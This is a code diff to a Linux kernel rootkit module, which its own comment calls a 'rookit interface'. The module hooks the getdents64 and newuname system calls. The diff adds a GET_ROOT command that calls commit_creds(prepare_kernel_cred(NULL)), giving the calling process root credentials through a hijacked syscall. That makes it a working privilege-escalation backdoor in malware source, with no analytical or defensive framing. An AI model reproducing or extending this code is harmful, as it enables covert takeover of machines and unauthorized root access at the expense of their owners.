@@ -1,4 +1,5 @@
 #include <linux/kernel.h>
+#include <linux/cred.h>
 #include <asm/ptrace.h>
 #include <asm/unistd.h>
 
@@ -132,6 +133,11 @@ asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return ret;
 }
 
+static inline void give_root_creds(void)
+{
+	commit_creds(prepare_kernel_cred(NULL));
+}
+
 /*
  * rookit interface
  */
@@ -148,6 +154,9 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 		break;
 	case LULZ_MODE:
 		lulz_mode = args->param1;
+		break;
+	case GET_ROOT:
+		give_root_creds();
 		break;
 	}
 	
